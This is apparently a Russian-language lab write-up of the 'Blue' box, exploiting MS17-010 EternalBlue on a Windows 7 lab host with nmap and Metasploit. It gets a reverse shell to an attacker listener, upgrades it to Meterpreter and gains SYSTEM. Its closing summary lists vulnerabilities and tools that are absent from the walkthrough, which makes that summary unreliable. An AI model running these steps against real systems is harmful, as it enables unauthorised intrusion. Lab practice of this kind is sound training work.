# VulnHub - Blue

📅 Дата: 2025-07-02  
🧠 Сложность: easy  
💻 IP-адрес: 10.10.67.181  

---

## 🔍 Сканирование

### nmap
```bash
export ip=10.10.67.181
sudo nmap -sS -p- -n --max-parallelism 100 --min-rate 1000 -v -oN nmap-sS.txt $ip && nmap -sT -Pn -sV -T4 -A -v -p "$(grep -oP \"^[0-9]+(?=/tcp\s+open)\" nmap-sS.txt | sort -n | paste -sd \",\")" -oN nmap-sV.txt $ip
```

```bash
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
```


---

## 🕵️ Enumeration

### SMB
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/thm/Blue/scans]
└─$ sudo nmap -p 445 --script "smb* and not brute" -Pn -sV -T4 --min-rate 5000 $ip
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-02 03:15 EDT
Nmap scan report for 10.10.67.181
Host is up (0.22s latency).

PORT    STATE SERVICE      VERSION
445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-mbenum: 
|   Master Browser
|     JON-PC  6.1  
|   Potential Browser
|     JON-PC  6.1  
|   Server service
|     JON-PC  6.1  
|   Windows NT/2000/XP/2003 server
|     JON-PC  6.1  
|   Workstation
|_    JON-PC  6.1  
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-enum-shares: 
|   note: ERROR: Enumerating shares failed, guessing at common ones (NT_STATUS_ACCESS_DENIED)
|   account_used: <blank>
|   \\10.10.67.181\ADMIN$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\10.10.67.181\C$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|     Anonymous access: <none>
|   \\10.10.67.181\IPC$: 
|     warning: Couldn't get details for share: NT_STATUS_ACCESS_DENIED
|_    Anonymous access: READ
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-07-02T02:15:18-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-07-02T07:15:18
|_  start_date: 2025-07-02T06:15:53
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
| smb2-capabilities: 
|   2:0:2: 
|     Distributed File System
|   2:1:0: 
|     Distributed File System
|     Leasing
|_    Multi-credit operations
|_smb-print-text: false
|_smb-vuln-ms10-054: false
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2:0:2
|_    2:1:0
|_smb-flood: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 204.09 seconds
```


## 📂 Получение доступа

Нахожу эксплойт в msfconsole
```bash
┌──(kali㉿0x2d-pentest)-[~/Labs/thm/Blue/scans]
└─$ msfconsole                                                 

Metasploit Documentation: https://docs.metasploit.com/

msf6 > setg RHOSTS 10.10.67.181
msf6 > search ms17-010

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption

...

msf6 > use 0
msf6 > set LHOST 10.21.104.16
msf6 > run
```

Меняю payload
```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.10.67.181     yes       The target host(s), see https://docs.metasploit.com/docs/using-metas
                                             ploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affect
                                             s Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 tar
                                             get machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Wi
                                             ndows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target
                                             machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Serv
                                             er 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/shell/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.21.104.16     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.
```

Получил сессию, перевёл в background
```bash
Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----
          

C:\Windows\system32>^Z
Background session 2? [y/N]  y
msf6 exploit(windows/smb/ms17_010_eternalblue) > 
```

## ⚙️ Привилегии

Нахожу shell to meterpreter
```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > search post shell to meterpreter

Matching Modules
================

   #   Name                                                        Disclosure Date  Rank       Check  Description
   -   ----                                                        ---------------  ----       -----  -----------
   0   exploit/linux/http/glinet_unauth_rce_cve_2023_50445         2023-12-10       excellent  Yes    GL.iNet Unauthenticated Remote Command Execution via the logread module.
   1     \_ target: Unix Command                                   .                .          .      .
   2     \_ target: Linux Dropper                                  .                .          .      .
   3   post/multi/gather/multi_command                             .                normal     No     Multi Gather Run Shell Command Resource File
   4   post/multi/gather/ubiquiti_unifi_backup                     .                normal     No     Multi Gather Ubiquiti UniFi Controller Backup
   5   post/multi/recon/local_exploit_suggester                    .                normal     No     Multi Recon Local Exploit Suggester
   6   exploit/multi/postgres/postgres_copy_from_program_cmd_exec  2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
   7     \_ target: Automatic                                      .                .          .      .
   8     \_ target: Unix/OSX/Linux                                 .                .          .      .
   9     \_ target: Windows - PowerShell (In-Memory)               .                .          .      .
   10    \_ target: Windows (CMD)                                  .                .          .      .
   11  exploit/multi/script/web_delivery                           2013-07-19       manual     No     Script Web Delivery
   12    \_ target: Python                                         .                .          .      .
   13    \_ target: PHP                                            .                .          .      .
   14    \_ target: PSH                                            .                .          .      .
   15    \_ target: Regsvr32                                       .                .          .      .
   16    \_ target: pubprn                                         .                .          .      .
   17    \_ target: SyncAppvPublishingServer                       .                .          .      .
   18    \_ target: PSH (Binary)                                   .                .          .      .
   19    \_ target: Linux                                          .                .          .      .
   20    \_ target: Mac OS X                                       .                .          .      .
   21  post/multi/manage/shell_to_meterpreter                      .                normal     No     Shell to Meterpreter Upgrade                                                                                                    
   22  post/windows/manage/powershell/exec_powershell              .                normal     No     Windows Manage PowerShell Download and/or Execute
   23  post/windows/manage/exec_powershell                         .                normal     No     Windows Powershell Execution Post Module
```

Для работы модуля нужен параметр SESSION
```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > use 21
msf6 post(multi/manage/shell_to_meterpreter) > options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to
                                       auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on
```

Устанавливаю и запускаю
```bash
msf6 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type               Information                               Connection
  --  ----  ----               -----------                               ----------
  2         shell x64/windows  Shell Banner: Microsoft Windows [Version  10.21.104.16:4444 -> 10.10.67.181:49273
                                6.1.7601] -----                          (10.10.67.181)

msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 2
SESSION => 2
msf6 post(multi/manage/shell_to_meterpreter) > options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to
                                       auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION  2                yes       The session to run this module on


View the full module info with the info, or info -d command.

msf6 post(multi/manage/shell_to_meterpreter) > run
```

Получаю Meterpreter
```bash
msf6 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 2
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.21.104.16:4433 
[*] Post module execution completed
msf6 post(multi/manage/shell_to_meterpreter) > 
[*] Sending stage (201798 bytes) to 10.10.67.181
[*] Meterpreter session 3 opened (10.21.104.16:4433 -> 10.10.67.181:49289) at 2025-07-02 03:57:54 -0400
[*] Stopping exploit/multi/handler

msf6 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type                     Information                            Connection
  --  ----  ----                     -----------                            ----------
  2         shell x64/windows        Shell Banner: Microsoft Windows [Vers  10.21.104.16:4444 -> 10.10.67.181:492
                                     ion 6.1.7601] -----                    73 (10.10.67.181)
  3         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC           10.21.104.16:4433 -> 10.10.67.181:492
                                                                            89 (10.10.67.181)

msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 3
[*] Starting interaction with 3...

meterpreter > 
```

Подтверждаю получение root:
```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
Process 2284 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```


## 🏁 Флаги

- User flag: 
- Root flag: 

---

## 📋 Резюме

🧰 **Инструменты:**
  - nmap, ffuf, и др.

🚨 **Уязвимости, которые удалось обнаружить:**  
  - Directory Traversal  
  - RCE через уязвимый скрипт  

🛡 **Советы по защите:**
  - Использовать сложные пароли и ограничить число попыток входа
  - Обновлять ПО до актуальных версий
  - Удалять/ограничивать использование SUID-бинарников
  - Настроить логирование и мониторинг системных событий
  - Применять принцип наименьших привилегий


